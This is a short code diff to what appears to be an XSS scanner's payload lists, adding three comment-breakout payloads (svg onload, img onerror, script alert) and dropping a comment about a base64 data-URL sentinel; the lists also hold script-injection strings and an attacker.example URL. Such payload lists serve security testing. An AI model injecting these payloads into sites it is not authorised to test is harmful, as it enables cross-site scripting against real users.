@@ -153,7 +153,6 @@ OBJECT_DATA = [
     "//attacker.example/{marker}",
     "data:text/html,<script>alert('{marker}')</script>",
     '"><script>alert(\'{marker}\')</script>',
-    # Sentinel for base64-encoded data URL — resolved dynamically in payload_gen.generate()
     "__B64_DATA_URL__:{marker}",
 ]
 
@@ -164,6 +163,9 @@ COMMENT = [
     "--><details open ontoggle=alert('{marker}')><!--",
     "--><input autofocus onfocus=alert('{marker}')><!--",
     "--><svg><animate onbegin=alert('{marker}') attributeName=x dur=1s><!--",
+    "--!><svg onload=alert('{marker}')>",
+    "--!><img src=x onerror=alert('{marker}')>",
+    "--!><script>alert('{marker}')</script>",
 ]
 
 CSS = [
